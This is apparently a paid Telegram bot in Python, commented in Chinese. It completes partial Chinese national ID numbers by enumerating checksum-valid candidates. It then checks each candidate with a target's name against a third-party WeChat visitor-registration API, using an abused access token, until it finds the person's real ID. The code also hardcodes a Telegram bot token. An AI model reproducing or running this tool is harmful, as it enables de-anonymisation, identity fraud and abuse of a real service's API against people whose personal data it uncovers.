import telebot
import requests
import time
import re
import threading
import json
import os
import itertools
from telebot import types
from concurrent.futures import ThreadPoolExecutor

# ================= 配置区 =================
API_TOKEN = '8417331227:AAESrsOPgEDMeu7NHgLMgoZrynkxoafBLBY'
ADMIN_ID = 6649617045 
POINTS_FILE = 'points.json'
TOKEN_FILE = 'token.txt'

# 默认 Token
DEFAULT_TOKEN = "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9..." # 保持原样

bot = telebot.TeleBot(API_TOKEN)
user_states = {}
generated_cache = {} 

# --- 数据持久化 ---
def load_data():
    pts = {}
    if os.path.exists(POINTS_FILE):
        try:
            with open(POINTS_FILE, 'r') as f:
                data = json.load(f)
                pts = {int(k): v for k, v in data.items()}
        except: pass
    tk = DEFAULT_TOKEN
    if os.path.exists(TOKEN_FILE):
        try:
            with open(TOKEN_FILE, 'r') as f: tk = f.read().strip()
        except: pass
    return pts, tk

user_points, CURRENT_X_TOKEN = load_data()

def save_points():
    with open(POINTS_FILE, 'w') as f: json.dump(user_points, f)

def save_token(new_tk):
    with open(TOKEN_FILE, 'w') as f: f.write(new_tk)

def is_valid_id(n):
    if len(n) != 18: return False
    try:
        n = n.upper()
        var = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
        var_id = ['1', '0', 'X', '9', '8', '7', '6', '5', '4', '3', '2']
        checksum = sum(int(n[i]) * var[i] for i in range(17)) % 11
        return var_id[checksum] == n[17]
    except: return False

# --- 核心核验任务 ---
def run_batch_task(chat_id, msg_id, name, id_list):
    global CURRENT_X_TOKEN
    headers = {"X-Token": CURRENT_X_TOKEN, "content-type": "application/json", "User-Agent": "Mozilla/5.0"}
    total, success_results, done, is_running = len(id_list), [], 0, True

    def progress_monitor():
        nonlocal done, is_running
        last_text = ""
        while is_running:
            if total > 0:
                percent = int(done / total * 100)
                filled = int(15 * done // total) 
                bar = "█" * filled + "▒" * (15 - filled)
                current_text = f"⌛ **核验中...**\n`[{bar}] {done}/{total} {percent}%`"
                if current_text != last_text:
                    try:
                        bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=current_text, parse_mode='Markdown')
                        last_text = current_text
                    except: pass
            time.sleep(3)

    threading.Thread(target=progress_monitor, daemon=True).start()

    def verify(id_no):
        nonlocal done, is_running
        if not is_running: return
        try:
            payload = {"id_type": "id_card", "mobile": "15555555555", "id_no": id_no, "name": name}
            r = requests.post("https://wxxcx.cdcypw.cn/wechat/visitor/create", json=payload, headers=headers, timeout=8)
            res = r.json()
            if res.get("code") == 401:
                is_running = False
                bot.send_message(chat_id, "🚨 Token 失效，请联系 @aaSm68 更新。")
                return
            if res.get("code") == 0:
                success_results.append(f"✨ **发现成功匹配：**\n{name} `{id_no}` 二要素验证成功 ✅")
        except: pass
        finally: done += 1

    with ThreadPoolExecutor(max_workers=15) as executor:
        executor.map(verify, id_list)

    is_running = False 
    time.sleep(1)
    if success_results:
        bot.send_message(chat_id, "\n\n".join(success_results), parse_mode='Markdown')
    else:
        bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=f"❌ 核验完成，未发现匹配结果。")

# --- 管理员指令 ---
@bot.message_handler(commands=['add'])
def add_points(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        _, tid, amt = message.text.split()
        user_points[int(tid)] = user_points.get(int(tid), 0) + int(amt)
        save_points()
        bot.reply_to(message, f"✅ 积分充值成功！当前余额: `{user_points[int(tid)]}`")
    except: bot.reply_to(message, "格式: `/add ID 分数`")

@bot.message_handler(commands=['set_token'])
def set_token_command(message):
    if message.from_user.id != ADMIN_ID: return
    msg = bot.send_message(message.chat.id, "🗝 请发送新的 X-Token:")
    bot.register_next_step_handler(msg, update_token_process)

def update_token_process(m):
    global CURRENT_X_TOKEN
    CURRENT_X_TOKEN = m.text.strip()
    save_token(CURRENT_X_TOKEN)
    bot.send_message(m.chat.id, "✅ Token 已更新！")

# --- 回调处理 ---
@bot.callback_query_handler(func=lambda call: call.data == "start_verify_flow")
def callback_start_verify(call):
    uid = call.from_user.id
    # 按钮处再次校验积分
    if user_points.get(uid, 0) < 100:
        bot.answer_callback_query(call.id, "❌ 积分不足(需100)，请联系 @aaSm68 充值", show_alert=True)
        return
    
    if uid not in generated_cache:
        bot.answer_callback_query(call.id, "❌ 缓存已过期。")
        return
    bot.send_message(call.message.chat.id, "👤 请输入要核验的姓名:")
    user_states[call.message.chat.id] = {'step': 'v_name_after_gen'}
    bot.answer_callback_query(call.id)

# --- 菜单指令 ---
@bot.message_handler(commands=['start'])
def start_cmd(message):
    uid = message.from_user.id
    pts = user_points.get(uid, 0)
    bot.send_message(message.chat.id, f"👋 **核验模式**\n💰 积分: `{pts}`\n💸 费用: 100/次\n👤 管理员: @aaSm68\n\n请输入姓名:", parse_mode='Markdown')
    user_states[message.chat.id] = {'step': 'v_name'}

@bot.message_handler(commands=['gen'])
def gen_cmd(message):
    uid = message.from_user.id
    pts = user_points.get(uid, 0)
    bot.send_message(message.chat.id, f"🛠 **生成模式**\n💰 积分: `{pts}`\n💸 费用: 50/次\n\n请输入补全号(x表示未知):", parse_mode='Markdown')
    user_states[message.chat.id] = {'step': 'g_card'}

# --- 状态机处理 ---
@bot.message_handler(func=lambda m: m.chat.id in user_states)
def handle_steps(message):
    state = user_states[message.chat.id]
    uid = message.from_user.id
    text = message.text.strip()

    # 生成模式
    if state['step'] == 'g_card':
        if len(text) != 18: return
        user_states[message.chat.id].update({'step': 'g_sex', 'card': text.lower()})
        bot.send_message(message.chat.id, "请输入性别(男/女/未知):")

    elif state['step'] == 'g_sex':
        # 校验积分 (生成费 50)
        if user_points.get(uid, 0) < 50:
            bot.reply_to(message, "❌ 余额不足！生成身份证需 50 积分。请联系 @aaSm68 充值。")
            del user_states[message.chat.id]
            return
            
        card = state['card']
        char_sets = [list(ch) if ch != 'x' else list("0123456789") for ch in card]
        if text == "男": char_sets[16] = ["1", "3", "5", "7", "9"]
        elif text == "女": char_sets[16] = ["0", "2", "4", "6", "8"]

        bot.send_message(message.chat.id, "⏳ 正在计算补全...")
        file_name, ids = "铭.txt", []
        for res in itertools.product(*char_sets):
            num = "".join(res)
            if is_valid_id(num): ids.append(num)
            if len(ids) >= 5000: break
        
        if ids:
            user_points[uid] -= 50
            save_points()
            generated_cache[uid] = {'ids': ids}
            with open(file_name, "w") as f: f.write("\n".join(ids))
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("🚀 立即核验这些号码 (100积分)", callback_data="start_verify_flow"))
            bot.send_document(message.chat.id, open(file_name, "rb"), caption=f"✅ 生成成功！共 `{len(ids)}` 个\n💰 扣除 50 积分\n当前余额: `{user_points[uid]}`", reply_markup=markup)
            os.remove(file_name)
        else: bot.send_message(message.chat.id, "❌ 未发现合法组合。")
        del user_states[message.chat.id]

    # 按钮后续流程：输入姓名后核验
    elif state['step'] == 'v_name_after_gen':
        if user_points.get(uid, 0) < 100:
            bot.reply_to(message, "❌ 余额不足！核验需 100 积分。")
            del user_states[message.chat.id]
            return
            
        user_points[uid] -= 100
        save_points()
        ids = generated_cache[uid]['ids']
        msg = bot.send_message(message.chat.id, "⚙️ 启动核验...")
        threading.Thread(target=run_batch_task, args=(message.chat.id, msg.message_id, text, ids)).start()
        del user_states[message.chat.id]

    # 普通核验模式
    elif state['step'] == 'v_name':
        user_states[message.chat.id].update({'step': 'v_ids', 'name': text})
        bot.send_message(message.chat.id, "请发送身份证号列表:")

    elif state['step'] == 'v_ids':
        # 校验积分 (核验费 100)
        if user_points.get(uid, 0) < 100:
            bot.reply_to(message, "❌ 余额不足！核验需 100 积分。请联系 @aaSm68 充值。")
            del user_states[message.chat.id]
            return
            
        raw = re.findall(r'\d{17}[\dXx]', text)
        v_ids = [i for i in raw if is_valid_id(i)]
        if not v_ids: 
            bot.reply_to(message, "❌ 未识别到有效证件号。")
            return
            
        user_points[uid] -= 100
        save_points()
        msg = bot.send_message(message.chat.id, "⚙️ 启动核验...")
        threading.Thread(target=run_batch_task, args=(message.chat.id, msg.message_id, state['name'], v_ids)).start()
        del user_states[message.chat.id]

if __name__ == '__main__':
    bot.infinity_polling()
